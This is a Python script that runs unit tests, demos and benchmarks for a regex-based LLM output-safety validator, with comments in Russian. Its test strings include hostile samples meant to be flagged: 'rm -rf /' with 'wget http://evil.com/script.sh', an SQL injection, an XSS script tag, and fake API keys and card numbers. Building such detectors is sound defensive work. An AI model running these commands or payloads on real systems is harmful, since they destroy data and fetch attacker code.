# -*- coding: utf-8 -*-
"""
Скрипт для запуска тестов и демонстрации работы системы безопасности
"""

import sys
import os
import unittest
import asyncio
from datetime import datetime

# Устанавливаем кодировку для Windows
if sys.platform.startswith("win"):
    os.environ["PYTHONIOENCODING"] = "utf-8"
    # Дополнительная настройка для вывода в консоль
    try:
        # Для Python 3.7+
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except AttributeError:
        # Для более старых версий Python
        import io

        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8")
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8")

from fast_parallel_validator import FastParallelSafetyValidator


def run_unit_tests():
    """Запуск unit-тестов"""
    print("[ТЕСТ] Запуск unit-тестов...")
    print("=" * 60)

    # Импортируем тесты
    from test_safety_patterns import (
        TestPIIPatterns,
        TestSensitivePatterns,
        TestCodeInjectionPatterns,
        TestModelExtractionPatterns,
        TestIntegratedValidator,
        TestPerformance,
    )

    # Создаем test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Добавляем тесты
    suite.addTests(loader.loadTestsFromTestCase(TestPIIPatterns))
    suite.addTests(loader.loadTestsFromTestCase(TestSensitivePatterns))
    suite.addTests(loader.loadTestsFromTestCase(TestCodeInjectionPatterns))
    suite.addTests(loader.loadTestsFromTestCase(TestModelExtractionPatterns))
    suite.addTests(loader.loadTestsFromTestCase(TestIntegratedValidator))
    suite.addTests(loader.loadTestsFromTestCase(TestPerformance))

    # Запускаем тесты
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    print("\n[РЕЗУЛЬТАТ] Результаты тестов:")
    print(f"   Всего тестов: {result.testsRun}")
    print(f"   Успешно: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"   Провалено: {len(result.failures)}")
    print(f"   Ошибки: {len(result.errors)}")

    return result.wasSuccessful()


def demo_safety_validation():
    """Демонстрация работы валидатора"""
    print("\n[ДЕМО] Демонстрация системы безопасности")
    print("=" * 60)

    validator = FastParallelSafetyValidator()

    test_cases = [
        {
            "name": "Безопасный текст",
            "text": "Привет! Как дела? Сегодня отличная погода для прогулки.",
            "expected_safe": True,
        },
        {
            "name": "Email и российский телефон",
            "text": "Свяжитесь со мной: user@example.com или +7-999-123-45-67",
            "expected_safe": False,
        },
        {
            "name": "SQL инъекция",
            "text": "SELECT * FROM users WHERE id = 1 OR '1'='1' --",
            "expected_safe": False,
        },
        {
            "name": "API ключи",
            "text": "Используйте этот ключ: sk-1234567890abcdef1234567890abcdef и token: ghp_abcd1234567890123456",
            "expected_safe": False,
        },
        {
            "name": "JavaScript XSS",
            "text": "Проверьте этот код: <script>alert('XSS attack!')</script>",
            "expected_safe": False,
        },
        {
            "name": "Российские документы",
            "text": "Мой СНИЛС: 123-456-789-12, ИНН: 1234567890, паспорт: 1234 567890",
            "expected_safe": False,
        },
        {
            "name": "Медицинские данные",
            "text": "Пациент болен диабетом, врач назначил лечение препаратом инсулин",
            "expected_safe": False,
        },
        {
            "name": "Command injection",
            "text": "Выполните команду: rm -rf / && wget http://evil.com/script.sh",
            "expected_safe": False,
        },
        {
            "name": "Банковские карты",
            "text": "Карта Visa: 4111-1111-1111-1111, МИР: 2204-1234-5678-9012",
            "expected_safe": False,
        },
        {
            "name": "Большой текст с угрозами",
            "text": ("Обычный текст " * 100)
            + " с опасностью: SELECT password FROM users WHERE admin = 'true'",
            "expected_safe": False,
        },
    ]

    for i, test_case in enumerate(test_cases, 1):
        print(f"\n[ТЕСТ {i}] {test_case['name']}")
        print(
            f"Текст: {test_case['text'][:100]}{'...' if len(test_case['text']) > 100 else ''}"
        )
        print("-" * 50)

        datetime.now()
        result = validator.validate_output(test_case["text"], f"demo_user_{i}")

        # Проверяем ожидаемый результат
        passed = result.is_safe == test_case["expected_safe"]
        status_icon = "[OK]" if passed else "[FAIL]"
        safety_icon = "[SAFE]" if result.is_safe else "[UNSAFE]"

        print(f"{status_icon} Тест: {'ПРОЙДЕН' if passed else 'НЕ ПРОЙДЕН'}")
        print(
            f"{safety_icon} Безопасность: {'Безопасно' if result.is_safe else 'Небезопасно'}"
        )
        print(f"[РИСК] Риск: {result.risk_score:.3f}")
        print(f"[НАРУШЕНИЯ] Нарушений: {len(result.violations)}")
        print(f"[ВРЕМЯ] Время: {result.processing_time:.3f}s")

        if result.violations:
            print("[НАРУШЕНИЯ] Типы нарушений:")
            for violation in result.violations[:3]:  # Показываем первые 3
                print(f"   - {violation}")
            if len(result.violations) > 3:
                print(f"   ... и еще {len(result.violations) - 3}")

        if result.sanitized_text != test_case["text"]:
            print(
                f"[ОЧИСТКА] Очищенный текст: {result.sanitized_text[:100]}{'...' if len(result.sanitized_text) > 100 else ''}"
            )


async def demo_async_performance():
    """Демонстрация асинхронной производительности"""
    print("\n[ASYNC] Демонстрация асинхронной производительности")
    print("=" * 60)

    validator = FastParallelSafetyValidator()

    # Тестовые тексты разной длины
    test_texts = [
        "Короткий текст с email: user@test.com",
        "Средний текст " * 50 + " с SQL: SELECT * FROM users",
        "Длинный текст " * 200 + " с API ключом: sk-1234567890abcdef",
        "Очень длинный текст " * 500 + " с командой: rm -rf /",
    ]

    print(f"Тестируем {len(test_texts)} текстов разной длины...")

    # Последовательная обработка
    print("\n[ПОСЛЕДОВАТЕЛЬНО] Последовательная обработка:")
    start_time = datetime.now()
    sequential_results = []
    for i, text in enumerate(test_texts):
        result = await validator.validate_output_async(text, f"seq_user_{i}")
        sequential_results.append(result)
        print(f"   Текст {i+1}: {len(text)} символов → {result.processing_time:.3f}s")
    sequential_time = (datetime.now() - start_time).total_seconds()

    # Параллельная обработка
    print("\n[ПАРАЛЛЕЛЬНО] Параллельная обработка:")
    start_time = datetime.now()
    tasks = [
        validator.validate_output_async(text, f"par_user_{i}")
        for i, text in enumerate(test_texts)
    ]
    parallel_results = await asyncio.gather(*tasks)
    parallel_time = (datetime.now() - start_time).total_seconds()

    for i, result in enumerate(parallel_results):
        print(
            f"   Текст {i+1}: {len(test_texts[i])} символов → {result.processing_time:.3f}s"
        )

    print("\n[СРАВНЕНИЕ] Сравнение производительности:")
    print(f"   Последовательно: {sequential_time:.3f}s")
    print(f"   Параллельно: {parallel_time:.3f}s")
    print(f"   Ускорение: {sequential_time/parallel_time:.2f}x")


def benchmark_patterns():
    """Бенчмарк regex-паттернов"""
    print("\n[BENCHMARK] Бенчмарк regex-паттернов")
    print("=" * 60)

    from fast_parallel_validator import FastRegexChecker

    checker = FastRegexChecker()

    # Тестовые данные для каждого типа
    benchmark_data = {
        "PII": [
            "email@test.com +7-999-123-45-67 1234-5678-9012-3456",
            "user@example.org 8(999)123-45-67 192.168.1.1",
            "admin@компания.рф +7-800-555-35-35 123-456-789-12",
        ]
        * 100,  # 300 проверок
        "Sensitive": [
            "api_key: sk-1234567890abcdef token: ghp_abcd1234567890",
            "password=admin123 secret: mysecret диагноз диабет",
            "зарплата 100000 рублей врач назначил лечение",
        ]
        * 100,
        "Code": [
            "SELECT * FROM users WHERE id = 1 OR '1'='1'",
            "<script>alert('xss')</script> eval(userInput)",
            "rm -rf / wget http://evil.com/shell sudo su",
        ]
        * 100,
        "Model": [
            "model.state_dict() torch.save(model, 'file')",
            "model.parameters() tf.saved_model.save()",
            "pickle.dump(model) model.summary()",
        ]
        * 100,
    }

    for check_type, texts in benchmark_data.items():
        print(f"\n[{check_type}] Тестируем {check_type} паттерны:")

        start_time = datetime.now()
        total_detections = 0

        for text in texts:
            if check_type == "PII":
                detected, _, _ = checker.check_pii(text)
            elif check_type == "Sensitive":
                detected, _, _ = checker.check_sensitive(text)
            elif check_type == "Code":
                detected, _ = checker.check_code(text)
            elif check_type == "Model":
                detected, _ = checker.check_model(text)

            if detected:
                total_detections += 1

        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()

        print(f"   Проверок: {len(texts)}")
        print(f"   Обнаружений: {total_detections}")
        print(f"   Время: {duration:.3f}s")
        print(f"   Скорость: {len(texts)/duration:.0f} проверок/сек")


def main():
    """Главная функция"""
    print("СИСТЕМА БЕЗОПАСНОСТИ ВЫВОДА LLM")
    print("=" * 60)
    print("Быстрая regex-валидация с параллельной обработкой")
    print("Версия: 2.0 (улучшенная)")
    print()

    if len(sys.argv) > 1:
        mode = sys.argv[1].lower()
    else:
        print("Выберите режим:")
        print("1. tests - Запуск unit-тестов")
        print("2. demo - Демонстрация валидации")
        print("3. async - Тест асинхронной производительности")
        print("4. benchmark - Бенчмарк regex-паттернов")
        print("5. all - Все тесты")

        choice = input("\nВведите номер (1-5): ").strip()
        mode_map = {
            "1": "tests",
            "2": "demo",
            "3": "async",
            "4": "benchmark",
            "5": "all",
        }
        mode = mode_map.get(choice, "demo")

    try:
        if mode == "tests":
            success = run_unit_tests()
            sys.exit(0 if success else 1)
        elif mode == "demo":
            demo_safety_validation()
        elif mode == "async":
            asyncio.run(demo_async_performance())
        elif mode == "benchmark":
            benchmark_patterns()
        elif mode == "all":
            print("[ALL] Запуск всех тестов и демонстраций...")
            success = run_unit_tests()
            demo_safety_validation()
            asyncio.run(demo_async_performance())
            benchmark_patterns()
            print("\n[ГОТОВО] Все тесты завершены!")
            sys.exit(0 if success else 1)
        else:
            print(f"[ОШИБКА] Неизвестный режим: {mode}")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\n\n[СТОП] Прерван пользователем")
    except Exception as e:
        print(f"\n[ОШИБКА] Ошибка: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
